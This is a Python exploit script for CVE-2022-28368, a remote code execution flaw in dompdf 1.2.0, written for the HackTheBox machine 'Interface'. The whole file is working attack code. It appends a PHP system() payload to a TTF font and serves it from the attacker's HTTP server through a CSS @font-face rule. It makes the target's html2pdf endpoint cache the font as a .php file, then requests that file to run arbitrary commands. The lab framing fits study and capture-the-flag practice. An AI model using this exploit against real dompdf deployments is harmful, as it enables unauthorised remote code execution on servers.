#!/usr/bin/env python3

"""
Author: poorduck
Date: 2023-05-05
Description: dompdf 1.2.0 RCE exploit for HackTheBox machine "interface"
CVE: CVE-2022-28368

Usage: python script.py [COMMAND]
                        - Where COMMAND is a system command to execute

Example: python script.py 'id'

Pre-requirements:
    - vHost must be added in the "/etc/hosts" file i.e "10.10.11.200 prd.m.rendering-api.interface.htb"
    - HackTheBox VPN is connected on "tun0" interface
"""

import requests
import netifaces as ni
import random
import string
import hashlib
import threading
import http.server
import socketserver
import sys
import re

session = requests.Session()
rhost = "http://prd.m.rendering-api.interface.htb"

# Enable burp proxy
#session.proxies = {"http": "http://127.0.0.1:8080"}

# Get HackTheBox vpn ip from tun0 interface
try:
    htb_vpn_inf = 'tun0'
    lhost = ni.ifaddresses(htb_vpn_inf)[ni.AF_INET][0]['addr']
except ValueError as e:
    print("[!] tun0 not found!")
    exit(e)

def init_files(ip, php):

    RND_STR = ''.join(random.choices(string.ascii_lowercase, k=10))

    # Raw bytex of https://github.com/positive-security/dompdf-rce/blob/main/exploit/exploit_font.php
    TTF_BYTES = b"\x00\x01\x00\x00\x00\x0a\x00\xef\xbf\xbd\x00\x03\x00\x20\x64\x75\x6d\x31\x00\x00\x00\x00\x00\x00\x00" \
                b"\xef\xbf\xbd\x00\x00\x00\x02\x63\x6d\x61\x70\x00\x0c\x00\x60\x00\x00\x00\xef\xbf\xbd\x00\x00\x00\x2c" \
                b"\x67\x6c\x79\x66\x35\x73\x63\xef\xbf\xbd\x00\x00\x00\xef\xbf\xbd\x00\x00\x00\x14\x68\x65\x61\x64\x07" \
                b"\xef\xbf\xbd\x51\x36\x00\x00\x00\xef\xbf\xbd\x00\x00\x00\x36\x68\x68\x65\x61\x00\xef\xbf\xbd\x03\xef" \
                b"\xbf\xbd\x00\x00\x01\x28\x00\x00\x00\x24\x68\x6d\x74\x78\x04\x44\x00\x0a\x00\x00\x01\x4c\x00\x00\x00" \
                b"\x08\x6c\x6f\x63\x61\x00\x0a\x00\x00\x00\x00\x01\x54\x00\x00\x00\x06\x6d\x61\x78\x70\x00\x04\x00\x03" \
                b"\x00\x00\x01\x5c\x00\x00\x00\x20\x6e\x61\x6d\x65\x00\x44\x10\xef\xbf\xbd\x00\x00\x01\x7c\x00\x00\x00" \
                b"\x38\x64\x75\x6d\x32\x00\x00\x00\x00\x00\x00\x01\xef\xbf\xbd\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00" \
                b"\x00\x01\x00\x03\x00\x01\x00\x00\x00\x0c\x00\x04\x00\x20\x00\x00\x00\x04\x00\x04\x00\x01\x00\x00\x00" \
                b"\x2d\xef\xbf\xbd\xef\xbf\xbd\x00\x00\x00\x2d\xef\xbf\xbd\xef\xbf\xbd\xef\xbf\xbd\xef\xbf\xbd\x00\x01" \
                b"\x00\x00\x00\x00\x00\x01\x00\x0a\x00\x00\x00\x3a\x00\x38\x00\x02\x00\x00\x33\x23\x35\x3a\x30\x38\x00" \
                b"\x01\x00\x00\x00\x01\x00\x00\x17\xef\xbf\xbd\xef\xbf\xbd\x16\x5f\x0f\x3c\xef\xbf\xbd\x00\x0b\x00\x40" \
                b"\x00\x00\x00\x00\xef\xbf\xbd\x15\x38\x06\x00\x00\x00\x00\xef\xbf\xbd\x26\xdb\xbd\x00\x0a\x00\x00\x00" \
                b"\x3a\x00\x38\x00\x00\x00\x06\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x4c\xef\xbf\xbd\xef" \
                b"\xbf\xbd\x00\x12\x04\x00\x00\x0a\x00\x0a\x00\x3a\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
                b"\x00\x00\x00\x00\x02\x04\x00\x00\x00\x00\x44\x00\x0a\x00\x00\x00\x00\x00\x0a\x00\x00\x00\x01\x00\x00" \
                b"\x00\x02\x00\x03\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
                b"\x00\x00\x00\x00\x00\x00\x04\x00\x36\x00\x03\x00\x01\x04\x09\x00\x01\x00\x02\x00\x00\x00\x03\x00\x01" \
                b"\x04\x09\x00\x02\x00\x02\x00\x00\x00\x03\x00\x01\x04\x09\x00\x03\x00\x02\x00\x00\x00\x03\x00\x01\x04" \
                b"\x09\x00\x04\x00\x02\x00\x00\x00\x73\x00\x00\x00\x00\x0a"

    PHP_CODE = php.encode()
    TTF_RAW_DATA = TTF_BYTES + b"<?php %b ?>" % PHP_CODE

    font_filename = 'exploit_font.php'
    with open(font_filename, 'wb') as f:
        f.write(TTF_RAW_DATA)

    FONT_URL = f'http://{ip}:8000/{font_filename}'
    FONT_FAMILY = RND_STR
    FONT_STYLE = 'normal'
    
    CSS_FILE = "@font-face {\n" \
              f"  font-family:'{FONT_FAMILY}';\n" \
              f"  src:url('{FONT_URL}');\n" \
               "  font-weight:'normal';\n" \
              f"  font-style:'{FONT_STYLE}';\n" \
               "}"
    
    css_filename = f'{RND_STR}.css'
    with open(css_filename, 'w') as f:
        f.write(CSS_FILE)

    hash_object = hashlib.md5(FONT_URL.encode())
    MD5_SUM = hash_object.hexdigest()

    cache_filename = FONT_FAMILY + "_" + FONT_STYLE + "_" + MD5_SUM + '.php'

    return cache_filename, css_filename, font_filename

def start_http_server(port):
    try:
        socketserver.TCPServer.allow_reuse_address = True
        Handler = http.server.SimpleHTTPRequestHandler
        httpd = socketserver.TCPServer(("", port), Handler)

        print("[+] Serving at port", port)
        httpd.serve_forever()
    except OSError as e:
        print(e)

def trigger_exploit(remote_host , local_host, server_port, css, cached):
    data = {"html": f"<link rel=stylesheet href='http://{local_host}:{server_port}/{css}'>"}
    session.post(f"{remote_host}/api/html2pdf", json=data)

    cached_url = f"{remote_host}/vendor/dompdf/dompdf/lib/fonts/{cached}"
    print("...", cached_url)
    resp = session.get(cached_url, timeout=10)

    if resp.status_code == 200:
        match = re.search(r"poorduck(.*)", resp.text, re.DOTALL)
        if match:
            print("[+] Output -\n")
            print(match.group(1))

    else:
        exit(f"[!] Something went wrong - {resp.status_code}")


if __name__ == "__main__":

    srv_port = 8000

    exploit_code = "echo 'poorduck'; "
    try:
        exploit_code += f"system('{sys.argv[1]}'); exit;"
    except IndexError as e:
        exit("Usage: script.py [COMMAND]")

    try:
        http_thread = threading.Thread(target=start_http_server, args=(srv_port,))
        http_thread.daemon = True
        http_thread.start()

        cache_fn, css_fn, font_fn =  init_files(ip=lhost, php=exploit_code)
        trigger_exploit(remote_host=rhost, local_host=lhost, server_port=srv_port, css=css_fn, cached=cache_fn)
    except KeyboardInterrupt as e:
        print(e)
    except Exception as e:
        print(e)
    finally:
        import os; [os.remove(f) for f in [css_fn, font_fn] if os.path.isfile(f)]
